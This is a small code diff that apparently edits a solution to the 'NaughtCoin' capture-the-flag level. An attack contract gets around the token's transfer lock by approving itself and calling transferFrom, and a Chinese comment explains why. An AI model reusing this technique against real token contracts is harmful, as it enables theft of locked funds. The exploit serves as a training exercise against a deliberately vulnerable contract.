@@ -37,16 +37,17 @@ contract NaughtCoin is ERC20 {
 
 contract AttackNaughtCoin {
     NaughtCoin naughtCoin;
-    address player;
+    address player = address(this);
+
     constructor () {
-        naughtCoin = new NaughtCoin(address(this));
+        naughtCoin = new NaughtCoin(player);
     }
 
     function attack(address receiver) public {
     
-        player = address(this);
         naughtCoin.approve(player, naughtCoin.balanceOf(player));
-   
+
+        // transferFrom 的调用者（即AttackNaughtCoin合约本身）必须是被授权地址(player)
         naughtCoin.transferFrom(player, receiver, naughtCoin.balanceOf(player));
     }
 
